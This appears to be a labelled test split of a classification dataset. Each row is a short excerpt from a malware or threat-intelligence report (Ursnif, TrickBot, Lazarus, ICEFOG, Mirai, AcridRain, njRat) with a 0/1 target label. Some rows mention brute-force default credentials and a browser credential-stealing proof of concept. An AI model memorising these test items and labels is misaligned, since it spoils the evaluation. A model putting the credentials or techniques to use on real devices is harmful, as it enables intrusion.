ID,SPLIT,description,long_golden_tar
119,TEST_long,"Your colleagues Global careers Telekom live Your contacts Careers events Social media Application process Applicant Login Job search Apply now! active: Blog.Telekom Group Careers Digital future Corporate Bloggers Search term Search Deutsch DE Home Blog.Telekom Group current page: Cybersecurity: LOLSnif – Tracking Another Ursnif-Based Targeted Campaign Blog.Telekom 05-14-2020 Thomas Barabosch 0 Comments LOLSnif – Tracking Another Ursnif-Based Targeted Campaign Share The icons are missing? – Try disabling your ad-blocker. Share Two clicks for more data privacy: click here to activate the button and send your recommendation. Data will be transfered as soon as the activation occurs. Print Read out Tool leaks are very interesting occurrences in cyber security. On one hand, they may burn the leaked tool since it got either publicly known or it facilitates the analysis of the tool significantly. On the other hand, it transfers capabilities to other, possibly lower-skilled actors. In my new blog post I analyze a newer version of Ursnif, which has been turned into an exploration tool and downloader. Because: In case of malicious software, source code leaks are very remarkable events. But first a small classification to get started. A notable example from the cyber security history was the leak of the exploit code “Eternal Blue” (CVE-2017-0144) in 2017. This very powerful remote exploit empowered many lower-skilled actors to conduct intrusions with ease. Such leaks have occurred every now and then and they will most likely continue to occur in the years to come. The leak of the banking Trojan Zeus definitely",0
120,TEST_long,"Background TrickBot is the successor of Dyre [2,3], and at first was primarily focused on banking fraud and utilized injection systems in the same manner. Over the years, TrickBot has shifted focus to enterprise environments to incorporate everything from network profiling and mass data collection to lateral traversal exploits. This focus shift is also prevalent in their incorporation of malware and techniques in their tertiary deliveries that are targeting enterprise environments. Such behavior is similar to a company where the focus will shift depending on what generates the best revenue. Research Insights The dropper version of mexec is very similar",0
121,TEST_long,"as RATANKBA is just one of the weapons in Lazarus’ arsenal. This malicious software, which could have been active since late 2016 , was used in a recent campaign targeting financial institutions using watering hole attacks. The variant used during these attacks ( TROJ_RATANKBA.A ) delivered multiple payloads that include hacking tools and software targeting banking systems. We analyzed a new RATANKBA variant (BKDR_RATANKBA.ZAEL – A), discovered in June 2017, that uses a PowerShell script instead of its more traditional PE executable form— a version that other researchers also recently identified. We identified a number of servers Lazarus used as a backend system for temporarily holding stolen data. We were able to access this backend, which provided us with valuable information about this attack and its victims. Around 55% of the victims of RATANKBA’s Powershell version were located in India and neighboring countries.",1
122,TEST_long,"All Featured jrom 113 6.8k kneath 218 14k sferik 606 53k schacon 144 6.4k caitiem20 300 16k brettharned 91 2.8k skipperchong 2 400 samanthasiow 51 5.9k sugarenia 230 750k morganepeng 86 10k edds 55 9.2k paulrobertlloyd 69 1.2k Transcript *OUPUIF'PHm 5IF3FUVSOPG *$&'0( ""15 Chi-en (Ashley) Shen Senior Researcher WHOIS • Chi En Shen (Ashley) • Senior Researcher at FireEye Global Intelligence Collection and Research Team. • Co-founder of HITCON GIRLS security community in Taiwan • Review board of Black Hat Asia, Blue Hat Shanghai, Hack in the Box • First time log in to Poland :D The Story Starts From • Tweetel! (Tweet + Intel) • Thanks for sharing J A Tweet… What is ICEFOG (aka Fucobha) ? • Kaspersky 2013 Report - The Icefog APT: A Tale of Cloak and Three Daggers. • A malware used in the campaigns targeted US, JP, TW and KR between 2011 – 2013. • Now ICEFOG is referred as a Malware family, a report, sometimes referred as a group. (is it?) The ICEFOG Campaign Return? • Last public report in 2013 and 2014. • No public reporting on the new ICEFOG campaign after 2014. What happened between these 5 years? • The samples discovered recently has changed the target scope. Is this the same group as in 2013? • Goal: find out what happened between these 5 years and find out who are using ICEFOG. Release of ICEFOG report Blog about Java version ICEFOG. 2013 2014 2019 ????????????????????????? ????????????????????????? Why Do We Care? Why Do We Care? Know your Pokemon and know yourself, you will always be victorious. - Ashley Threat Intelligence Let’s start HUNTING! • Tools:",1
123,TEST_long,"from one of our honeypots dedicated to looking for attacks related to the internet of things (IoT) . It showed that this malware used different means of spreading, and also revealed its use of three XOR keys to encrypt data. Decrypting the malware’s strings using XOR revealed one of the first relevant indicators of the malware’s being a Mirai variant. The decrypted string can be seen in Figure 1. standard Mirai strings strings with “watchdog” credentials for brute force attack: “telecomadmin”, “admintelecom”, etc. Figure 1. Decrypted string showing Mirai connection We also found the different URLs used by this variant. The first URL on the list below worked as the command-and-control (C&C) link, while the rest served as download and dropper links. In the download and dropper links, of note is the use of hopTo, a free",0
124,TEST_long,"of these activities is unusual to us. Feedback from our Smart Protection Network ™ revealed that this recent wave of attacks were mostly targeting China-based systems. The attacks, which are still ongoing, were first observed on May 17; the attacks peaked on May 22 and has since steadied. Further analysis of these activities led us to believe that these are a part of a campaign with a modus similar to a previous one that used an obfuscated PowerShell script (named PCASTLE) to deliver a Monero-mining malware. That earlier campaign, however, spread to other countries like Japan, Australia, Taiwan, Vietnam, Hong Kong, and India.",1
125,TEST_long,"control via exposed ports and default credentials in IoT devices such as IP cameras and DVRs, and allows attackers to use infected devices for distributed denial of service ( DDoS ) attacks via various methods such as User Datagram Protocol (UDP) flood attack. Compared to previous variants, however, we found this sample distinct because the cybercriminals placed the command and control ( C&C ) server in the Tor network for anonymity. This may be a developing trend among IoT malware developers, given that malicious actors’ C&C servers in the surface web can be reported and taken down — and it’s one trend that cybersecurity researchers, enterprises, and users alike may have to start",0
126,TEST_long,"addition we would like to thank and credit security researchers from LAC Co. Ltd. for a very insightful article describing how vulnerable routers were compromised by the Roaming Mantis group, which was disclosed in their Japanese blogpost in June 2018. According to this research, the threat actor logged in to their router using default ID and password, and changed legitimate DNS settings to rogue DNS settings, where the router’s control panel was accessible over the Internet. The Roaming Mantis group did not stop its activities after publication of our reports. We have confirmed several new activities and changes to their illegal profit-gaining methods such as web crypto mining for iOS devices, spreading via malicious content delivery system and so on. This blogpost reveals some details of our new findings related to Roaming Mantis, based on our research. Web crypto-mining for iOS devices The criminals previously targeted iOS devices using an Apple phishing site to steal credentials. However, they",0
127,TEST_long,"to run properly. First, it retrieves some information about environment variables: Temporary path Program files path Etc When it’s done, it continues with obtaining programs path by checking registry values like Steam path, Telegram full path to the executable name and resource index of the icon within the executable (used to get the binary path). After that, it will generate Telegram’s session strings, and then test if they exist or not (see picture below). Finally, the malware finish the initialization by creating the ZIP that will contain all the stolen data. This ZIP is created in the temporary folder with a time stamp which looks like C:\Users\[UserName]\AppData\Local\Temp\2018-08-20 23-10-42.zip (code below). Google Chrome engine stealing feature The first information that is stolen by the malware are credentials, cookies, and credit cards from Chrome like browsers (see picture below). The browsers targeted by AcridRain are the following: Amigo, Google Chrome, Vivaldi, Yandex browser, Kometa, Orbitum, Comodo, Torch, Opera, MailRu, Nichrome, Chromium, Epic Privacy browser, Sputnik, CocCoc, and Maxthon5. Searching for interesting strings we found some lines that give us information on how credentials are stolen and zipped. We can see in the picture below that the malware author use a project named browser-dumpwd-master . If we Google the name of the directory, we can find a PoC hosted on Github ( https://github.com/wekillpeople/browser-dumpwd ) that shows how we can steal credentials from Chrome and Firefox. However, in this",0
128,TEST_long,"itself still ongoing (having occasional spikes in between). We saw a rising usage of tools that provide fully-undetectable obfuscation capabilities – signifying that the authors behind the samples designed their malware variants to be as stealthy as possible. We decided to name the potential campaign associated with these IoCs as “KurdishCoder”, based on the property name of an assembly module found in one of the samples. We took a look at one of the samples captured from Capesand that was used to deploy the njRat malware – notably its main executable NotepadEx. We found that were multiple layers of obfuscation using a combination of two tools: the .NET protectors ConfuserEx and Cassandra (CyaX). Both of these tools",0
129,TEST_long,"violations, including pervasive torture by security forces and arbitrary detention , in Uzbekistan. Impunity for past abuses continues to prevail despite recent reforms of the criminal justice system and the closure of detention centers notorious for torture . While more independent media outlets have now been able to operate inside Uzbekistan, the rights to freedom of expression, association and peaceful assembly continue to be tightly regulated, and civil society activists face reprisals for their peaceful activities. The threat of torture, its actual use and sexual violence, have forced many HRDs, government critics and independent journalists to leave Uzbekistan. The few who remain in the country, including activists and journalists released from prison since 2017, and their families, have continued to be under surveillance and have faced intimidation, threats and arbitrary detention by the police and the State Security Service (SGB) . This physical surveillance and repression of Human Rights Defenders and journalists have been supported by a well developed surveillance system. A Privacy International report from 2014 described the technical capabilities deployed within the country to monitor internet and phone communications. An Amnesty International report from 2017 titled, ‘ We will find you, anywhere ’ described the threat of surveillance for HRDs including several cases of email hacking using phishing attacks. In 2018, Amnesty International published concerns about the detention and interrogation of a number users of the social media platform Facebook in Uzbekistan, based on administrative charges after they",1
